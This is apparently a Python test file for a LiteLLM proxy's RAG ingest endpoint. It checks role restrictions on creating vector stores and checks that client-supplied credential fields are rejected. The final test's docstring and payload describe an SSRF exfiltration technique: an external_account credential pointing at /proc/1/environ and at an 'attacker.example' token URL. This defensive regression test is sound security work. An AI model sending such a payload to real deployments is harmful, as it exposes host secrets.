"""
Tests for RAG proxy endpoints.

Covers:
- internal_user_viewer restriction: can only ingest to existing vector stores (must provide vector_store_id)
"""

import io
import os
import sys
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi.testclient import TestClient

sys.path.insert(
    0, os.path.abspath("../../../../..")
)  # Adds the parent directory to the system path

from litellm.proxy._types import LitellmUserRoles, UserAPIKeyAuth
from litellm.proxy.auth.user_api_key_auth import user_api_key_auth
from litellm.proxy.proxy_server import app


@pytest.fixture
def client_internal_user_viewer():
    """Test client with internal_user_viewer auth."""
    mock_auth = UserAPIKeyAuth(
        user_id="test_viewer_user",
        user_role=LitellmUserRoles.INTERNAL_USER_VIEW_ONLY.value,
    )
    original_overrides = app.dependency_overrides.copy()
    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides = original_overrides


@pytest.fixture
def client_internal_user():
    """Test client with internal_user auth (can create new vector stores)."""
    mock_auth = UserAPIKeyAuth(
        user_id="test_internal_user",
        user_role=LitellmUserRoles.INTERNAL_USER.value,
    )
    original_overrides = app.dependency_overrides.copy()
    app.dependency_overrides[user_api_key_auth] = lambda: mock_auth
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides = original_overrides


def test_internal_user_viewer_rag_ingest_without_vector_store_id_rejected(
    client_internal_user_viewer,
):
    """
    internal_user_viewer cannot create new vector stores - must provide vector_store_id.
    """
    # Form upload without vector_store_id (would create new store)
    response = client_internal_user_viewer.post(
        "/v1/rag/ingest",
        files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
        data={
            "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai"}}}'
        },
    )

    assert response.status_code == 403
    detail = response.json()
    assert "detail" in detail
    error_msg = (
        detail["detail"]["error"]
        if isinstance(detail["detail"], dict)
        else str(detail["detail"])
    )
    assert "internal_user_viewer" in error_msg
    assert "vector_store_id" in error_msg


def test_internal_user_viewer_rag_ingest_with_vector_store_id_passes_check(
    client_internal_user_viewer,
):
    """
    internal_user_viewer with vector_store_id passes the role check.
    (Actual ingest may fail due to missing API keys, but we get past 403.)
    """
    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
        new_callable=AsyncMock,
        return_value={"vector_store_id": "vs_existing", "file_id": "file_123"},
    ):
        response = client_internal_user_viewer.post(
            "/v1/rag/ingest",
            files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
            data={
                "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai","vector_store_id":"vs_699651f6b6688191b0a210c00a686d20"}}}'
            },
        )

    # Should not be 403 (role check passed)
    assert response.status_code != 403, (
        f"internal_user_viewer with vector_store_id should pass role check. "
        f"Response: {response.json()}"
    )


def test_internal_user_rag_ingest_without_vector_store_id_allowed(client_internal_user):
    """
    internal_user can create new vector stores (no vector_store_id required).
    """
    with patch(
        "litellm.proxy.rag_endpoints.endpoints.litellm.aingest",
        new_callable=AsyncMock,
        return_value={"vector_store_id": "vs_new", "file_id": "file_123"},
    ):
        response = client_internal_user.post(
            "/v1/rag/ingest",
            files={"file": ("sample.txt", io.BytesIO(b"test content"), "text/plain")},
            data={
                "request": '{"ingest_options":{"vector_store":{"custom_llm_provider":"openai"}}}'
            },
        )

    # Should not be 403
    assert response.status_code != 403, (
        f"internal_user should be allowed to create new vector stores. "
        f"Response: {response.json()}"
    )


@pytest.mark.parametrize(
    "blocked_field",
    [
        "vertex_credentials",
        "vertex_ai_credentials",
        "aws_access_key_id",
        "aws_secret_access_key",
        "aws_session_token",
        "api_key",
        "api_base",
    ],
)
def test_rag_ingest_blocks_clientside_credentials(client_internal_user, blocked_field):
    """
    Credential fields in ingest_options.vector_store must be rejected.

    Accepting user-supplied credentials (e.g. vertex_credentials with
    type=external_account + credential_source.file=/proc/1/environ) allows
    any authenticated user to exfiltrate host secrets via SSRF through
    google-auth's identity_pool credential refresh.
    """
    payload = {
        "ingest_options": {
            "vector_store": {
                "custom_llm_provider": "vertex_ai",
                "vertex_project": "x",
                blocked_field: {
                    "type": "external_account",
                    "token_url": "http://attacker.example/sts",
                },
            }
        }
    }
    response = client_internal_user.post(
        "/v1/rag/ingest",
        json={
            **payload,
            "file": {
                "filename": "q.txt",
                "content": "dGVzdA==",
                "content_type": "text/plain",
            },
        },
    )
    assert (
        response.status_code == 400
    ), f"Expected 400 when '{blocked_field}' is set clientside, got {response.status_code}: {response.json()}"
    body = response.json()
    assert blocked_field in str(
        body
    ), f"Response should mention '{blocked_field}': {body}"
